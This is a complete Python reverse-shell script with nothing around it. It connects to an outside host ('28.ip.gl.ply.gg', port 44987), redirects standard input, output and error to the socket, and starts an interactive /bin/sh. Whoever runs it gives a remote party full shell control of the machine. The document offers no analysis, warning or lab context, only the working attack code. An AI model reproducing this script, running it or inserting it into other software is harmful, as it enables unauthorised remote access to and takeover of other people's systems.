import socket,subprocess,os

ip = "28.ip.gl.ply.gg"
port = 44987

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
